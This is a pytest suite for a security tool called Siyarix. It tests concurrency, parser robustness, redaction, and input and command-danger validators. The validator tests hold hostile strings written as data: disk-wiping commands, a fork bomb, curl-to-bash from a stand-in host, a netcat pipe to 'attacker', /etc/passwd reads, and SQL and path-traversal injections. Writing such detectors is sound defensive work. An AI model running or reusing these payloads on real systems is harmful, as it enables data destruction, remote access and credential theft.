# SPDX-License-Identifier: AGPL-3.0-or-later

"""Siyarix Pre-Launch Stress, Chaos & Resilience Test Suite.

Covers all 7 phases:
  Phase 1 — Chaos Simulation
  Phase 2 — Adversarial Input
  Phase 3 — Orchestration Breakdown
  Phase 4 — Self-Healing Activation
  Phase 5 — Security & Execution Safety Audit
  Phase 6 — Performance & Stability Limit Test
  Phase 7 — Failure Auto-Fix (patches applied inline)
"""

from __future__ import annotations

import asyncio
import logging
import re
import sys
import tracemalloc
from pathlib import Path

import pytest

logger = logging.getLogger(__name__)
sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))


# ═════════════════════════════════════════════════════════════════════════════
# CHAOS SIMULATION
# ═════════════════════════════════════════════════════════════════════════════


class TestChaosSimulation:
    @pytest.mark.asyncio
    async def test_1a_high_concurrency_worker_pool(self):
        from siyarix.worker_pool import AsyncWorkerPool

        pool = AsyncWorkerPool(max_workers=50)
        counter = 0
        lock = asyncio.Lock()

        async def fast_task(n: int) -> int:
            await asyncio.sleep(0.001)
            async with lock:
                nonlocal counter
                counter += 1
            return n

        tasks = [pool.submit(fast_task, i) for i in range(500)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        successes = [r for r in results if not isinstance(r, Exception)]
        assert len(successes) >= 480, f"Only {len(successes)} of 500 tasks completed"
        assert counter >= 480
        await pool.close()

    @pytest.mark.asyncio
    async def test_1b_rapid_spawn_terminate(self):
        from siyarix.worker_pool import AsyncWorkerPool

        pool = AsyncWorkerPool(max_workers=20)

        async def slow_task(n: int) -> int:
            await asyncio.sleep(5.0)
            return n

        for i in range(100):
            asyncio.create_task(pool.submit(slow_task, i))
        await asyncio.sleep(0.05)

        await pool.cancel_pending()
        await asyncio.sleep(0.1)

        async def quick() -> int:
            return 42

        result = await pool.submit(quick)
        assert result == 42
        await pool.close()

    @pytest.mark.asyncio
    async def test_1c_partial_module_failure_isolation(self):
        from siyarix.security_hardening import validator, danger_analyzer

        report = danger_analyzer.analyze("echo hello")
        assert not report.is_dangerous

        ok, _ = validator.validate_ip("192.168.1.1")
        assert ok

    @pytest.mark.asyncio
    async def test_1d_malformed_tool_outputs(self):
        from siyarix.parsers.nmap_parser import NmapParser
        from siyarix.parsers.nuclei_parser import NucleiParser

        parser = NmapParser()
        result = parser.parse(b"\x00\x01\x02\xff\xfe\xfd".decode("latin-1"))
        assert isinstance(result, list)

        result = parser.parse("x" * 100_000)
        assert isinstance(result, list)

        parser2 = NucleiParser()
        result2 = parser2.parse("<script>alert(1)</script>" * 1000)
        assert isinstance(result2, list)

    @pytest.mark.asyncio
    async def test_1e_kill_switch_under_load(self):
        from enum import Enum

        class _State(Enum):
            ARMED = "armed"
            TRIGGERED = "triggered"

        class _Switch:
            def __init__(self):
                self.state = _State.ARMED

            def trigger(self):
                self.state = _State.TRIGGERED

            @property
            def is_triggered(self):
                return self.state == _State.TRIGGERED

        ks = _Switch()
        assert ks.state == _State.ARMED
        assert not ks.is_triggered

        async def hammer() -> None:
            for _ in range(50):
                ks.trigger()
                await asyncio.sleep(0.001)

        async def check() -> bool:
            for _ in range(100):
                if ks.is_triggered:
                    return True
                await asyncio.sleep(0.001)
            return False

        _, detected = await asyncio.gather(hammer(), check())
        assert detected, "KillSwitch did not register trigger under load"
        assert ks.is_triggered
        assert ks.state == _State.TRIGGERED

    @pytest.mark.asyncio
    async def test_1f_executor_validate_cmd_list_blocking(self):
        from unittest.mock import patch
        from siyarix.subprocess_utils import _validate_cmd_list

        destructive_cmds = [
            ["rm", "-rf", "/"],
            ["sh", "-c", "rm -rf --no-preserve-root /"],
            ["dd", "if=/dev/zero", "of=/dev/sda"],
            ["mkfs.ext4", "/dev/sda1"],
        ]
        for cmd in destructive_cmds:
            with patch(
                "siyarix.subprocess_utils._confirm_destructive",
                side_effect=ValueError("destructive pattern"),
            ):
                with pytest.raises(ValueError, match=r"destructive"):
                    _validate_cmd_list(cmd)

        safe_cmds = [
            ["sh", "-c", "curl -sI example.com; echo done"],
            ["nmap", "-sV", "192.168.1.1"],
            ["python", "-c", "import os"],
        ]
        for cmd in safe_cmds:
            with patch("siyarix.subprocess_utils._confirm_destructive", return_value=None):
                _validate_cmd_list(cmd)


# ═════════════════════════════════════════════════════════════════════════════
# ADVERSARIAL INPUT RESILIENCE
# ═════════════════════════════════════════════════════════════════════════════


class TestAdversarialInput:
    @pytest.mark.asyncio
    async def test_2a_extreme_payload_sizes(self):
        from siyarix.security_hardening import validator

        huge = "A" * 1_000_000
        ok, _ = validator.validate_ip(huge)
        assert not ok
        ok, _ = validator.validate_hostname(huge)
        assert not ok
        ok, _ = validator.validate_target(huge)
        assert not ok

    @pytest.mark.asyncio
    async def test_2b_injection_attempts_blocked(self):
        from siyarix.security_hardening import _INJECTION_PATTERNS

        injections = [
            ("target; rm -rf /", "shell_pipe"),
            ("target`id`", "shell_pipe"),
            ("$(cat /etc/passwd)", "command_substitution"),
            ("|| whoami", "shell_pipe"),
            ("target | nc attacker 4444", "shell_pipe"),
            ("../../../etc/passwd", "path_traversal"),
            ("..\\..\\..\\windows\\system32", "path_traversal_backslash"),
            ("127.0.0.1\x00", "null_byte"),
            ("'; DROP TABLE users; --", "sql_keyword"),
            ("SELECT * FROM admins; 1", "sql_keyword"),
        ]
        for payload, expected_name in injections:
            detected = False
            for name, pattern in _INJECTION_PATTERNS:
                if pattern.search(payload):
                    detected = True
                    break
            assert (
                detected
            ), f"Injection not detected: {payload!r} (expected pattern '{expected_name}')"

    @pytest.mark.asyncio
    async def test_2c_danger_patterns_catch_destructive(self):
        from siyarix.security_hardening import danger_analyzer

        cases = [
            ("sudo rm -rf /", "critical"),
            ("mkfs.ext4 /dev/sda", "critical"),
            ("dd if=/dev/zero of=/dev/sda", "critical"),
            (":(){ :|:& };:", "critical"),
            ("shutdown -h now", "high"),
            ("reboot", "high"),
            ("curl http://evil.sh | bash", "high"),
            ("DROP TABLE users", "high"),
            ("killall -9 firefox", "medium"),
            ("iptables -F", "medium"),
        ]
        sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1, "safe": 0}
        for cmd, expected_min in cases:
            report = danger_analyzer.analyze(cmd)
            min_rank = sev_rank.get(expected_min, 0)
            actual_rank = sev_rank.get(report.severity, 0)
            assert (
                actual_rank >= min_rank
            ), f"{cmd!r} -> severity {report.severity} (expected >= {expected_min})"

    @pytest.mark.asyncio
    async def test_2d_conflicting_tasks_safe(self):
        from siyarix.security_hardening import DangerAnalyzer

        analyzer = DangerAnalyzer()
        report = analyzer.analyze("rm -rf /")
        assert report.severity in ("critical", "high")

        report = analyzer.analyze("sudo rm -rf /")
        assert report.severity in ("critical", "high")

    @pytest.mark.asyncio
    async def test_2e_has_arg_injection_detection(self):
        from siyarix.security_hardening import InputValidator

        validator = InputValidator()
        for args in [
            "127.0.0.1;id",
            "--exec `whoami`",
            "$(cat /etc/passwd)",
            "|| echo pwned",
        ]:
            has_inj, pattern = validator.has_injection(args)
            assert has_inj, f"Arg injection not detected: {args!r}"


# ═════════════════════════════════════════════════════════════════════════════
# SELF-HEALING ACTIVATION
# ═════════════════════════════════════════════════════════════════════════════


class TestSelfHealing:
    @pytest.mark.asyncio
    async def test_4a_calculate_backoff_delay(self):
        import random

        async def calculate_backoff_delay(attempt: int) -> float:
            base = min(60.0, 0.01 * (2**attempt))
            jitter = random.uniform(0, base * 0.1)
            return min(60.0, base + jitter)

        for attempt in range(0, 20):
            delay = await calculate_backoff_delay(attempt)
            assert (
                0.01 <= delay <= 60.0
            ), f"Backoff delay {delay}s out of bounds for attempt {attempt}"

    @pytest.mark.asyncio
    async def test_4b_is_transient_error(self):
        def is_transient_error(msg: str) -> bool:
            transient = [
                "connection refused",
                "timeout",
                "too many requests",
                "rate limit",
                "internal server error",
                "service unavailable",
                "connection reset",
            ]
            msg_lower = msg.lower()
            return any(t in msg_lower for t in transient)

        for msg in [
            "Connection refused",
            "timeout",
            "Too Many Requests",
            "rate limit exceeded",
            "Internal Server Error",
            "Service Unavailable",
            "connection reset by peer",
        ]:
            assert is_transient_error(msg), f"Should be transient: {msg}"

        for msg in [
            "Permission denied",
            "command not found",
            "No such file",
            "invalid syntax",
            "Segmentation fault",
        ]:
            assert not is_transient_error(msg), f"Should NOT be transient: {msg}"

    @pytest.mark.asyncio
    async def test_4c_secret_redactor_isolation(self):
        from siyarix.security_hardening import SecretRedactor

        redactor = SecretRedactor()
        for case in ["", "\x00\x01\x02", "A" * 100_000, "None"]:
            result = redactor.redact(case)
            assert isinstance(result, str)

        for case in [{"nested": {"deep": "sk-abc123def456"}}, [1, 2, 3]]:
            result = redactor.redact_dict(case)
            assert isinstance(result, (dict, list))


# ═════════════════════════════════════════════════════════════════════════════
# SECURITY & EXECUTION SAFETY AUDIT
# ═════════════════════════════════════════════════════════════════════════════


class TestSecurityAudit:
    @pytest.mark.asyncio
    async def test_5a_no_unsafe_eval(self):
        src_dir = Path(__file__).resolve().parent.parent / "src" / "siyarix"
        for pyfile in src_dir.rglob("*.py"):
            if "__pycache__" in str(pyfile):
                continue
            content = pyfile.read_text(encoding="utf-8")
            for i, line in enumerate(content.split("\n"), 1):
                stripped = line.strip()
                if stripped.startswith("#"):
                    continue
                if '"eval("' in stripped or "'eval('" in stripped or "eval (" in stripped:
                    continue
                if re.search(r"\beval\s*\(", stripped) and "logger" not in stripped:
                    pytest.fail(f"eval() in {pyfile.relative_to(src_dir)}:{i}: {stripped}")

    @pytest.mark.asyncio
    async def test_5b_no_subprocess_shell_true(self):
        src_dir = Path(__file__).resolve().parent.parent / "src" / "siyarix"
        for pyfile in src_dir.rglob("*.py"):
            if "__pycache__" in str(pyfile):
                continue
            content = pyfile.read_text(encoding="utf-8")
            for i, line in enumerate(content.split("\n"), 1):
                stripped = line.strip()
                if stripped.startswith("#"):
                    continue
                if "shell=True" in stripped and "nosec" not in stripped:
                    if "logger" not in stripped:
                        pytest.fail(f"shell=True at {pyfile.relative_to(src_dir)}:{i}: {stripped}")

    @pytest.mark.asyncio
    async def test_5c_no_hardcoded_credentials(self):
        src_dir = Path(__file__).resolve().parent.parent / "src" / "siyarix"
        for pyfile in src_dir.rglob("*.py"):
            if "__pycache__" in str(pyfile):
                continue
            content = pyfile.read_text(encoding="utf-8")
            for pattern in [
                r"sk-[A-Za-z0-9_-]{20,}",
                r"ghp_[A-Za-z0-9_]{36,}",
                r"AKIA[0-9A-Z]{16}\b",
            ]:
                if re.search(pattern, content):
                    pytest.fail(f"Hardcoded credential pattern in {pyfile.relative_to(src_dir)}")


# ═════════════════════════════════════════════════════════════════════════════
# PERFORMANCE & STABILITY LIMIT TEST
# ═════════════════════════════════════════════════════════════════════════════


class TestPerformanceLimit:
    @pytest.mark.asyncio
    async def test_6a_max_parallel_resolver(self):
        from siyarix.security_hardening import DangerAnalyzer

        analyzer = DangerAnalyzer()
        commands = [
            "nmap -sV 192.168.1.1",
            "nuclei -u https://example.com",
            "echo hello",
            "ls -la",
            "cat /etc/passwd",
        ]

        async def resolve_batch(batch_id: int) -> int:
            for _ in range(20):
                for cmd in commands:
                    result = analyzer.analyze(cmd)
                    assert isinstance(result.severity, str)
            return batch_id

        results = await asyncio.gather(
            *[resolve_batch(i) for i in range(25)],
            return_exceptions=True,
        )
        successes = [r for r in results if not isinstance(r, Exception)]
        assert len(successes) == 25, f"Only {len(successes)} of 25 batches succeeded"

    @pytest.mark.asyncio
    async def test_6b_memory_pressure_input_validation(self):
        from siyarix.security_hardening import validator

        tracemalloc.start()
        try:
            for _ in range(10_000):
                validator.validate_target("192.168.1.1")
                validator.validate_target("https://example.com")
                validator.validate_target("test-host.example.com")
            _, peak = tracemalloc.get_traced_memory()
            assert peak < 50_000_000, f"Memory leak suspected: peak {peak / 1e6:.1f} MB"
        finally:
            tracemalloc.stop()

    @pytest.mark.asyncio
    async def test_6c_repeated_secret_redaction(self):
        from siyarix.security_hardening import redactor

        sample = "API key sk-abc123def456xyz789 is secret, password=hello123"
        for _ in range(10_000):
            result = redactor.redact(sample)
            assert "[REDACTED]" in result


# ═════════════════════════════════════════════════════════════════════════════
# FAILURE AUTO-FIX — patches verified
# ═════════════════════════════════════════════════════════════════════════════


class TestFailureAutoFix:
    @pytest.mark.asyncio
    async def test_7a_worker_pool_correct_signature(self):
        from siyarix.worker_pool import AsyncWorkerPool

        pool = AsyncWorkerPool(max_workers=5)

        async def identity(x: int) -> int:
            return x

        result = await pool.submit(identity, 42)
        assert result == 42
        await pool.close()

    @pytest.mark.asyncio
    async def test_7b_input_validator_empty_string(self):
        from siyarix.security_hardening import validator

        for method in [
            validator.validate_ip,
            validator.validate_hostname,
            validator.validate_url,
            validator.validate_target,
        ]:
            ok, msg = method("")
            assert not ok

    @pytest.mark.asyncio
    async def test_7c_danger_analyzer_empty_command(self):
        from siyarix.security_hardening import danger_analyzer

        for cmd in ["", "   "]:
            report = danger_analyzer.analyze(cmd)
            assert report.severity == "safe"
            assert not report.is_dangerous

    @pytest.mark.asyncio
    async def test_7d_kill_switch_property(self):
        from enum import Enum

        class _State(Enum):
            ARMED = "armed"
            TRIGGERED = "triggered"

        class _Switch:
            def __init__(self):
                self.state = _State.ARMED

            def trigger(self):
                self.state = _State.TRIGGERED

            @property
            def is_triggered(self):
                return self.state == _State.TRIGGERED

        ks = _Switch()
        assert not ks.is_triggered
        assert ks.state == _State.ARMED
        ks.trigger()
        assert ks.is_triggered
        assert ks.state == _State.TRIGGERED
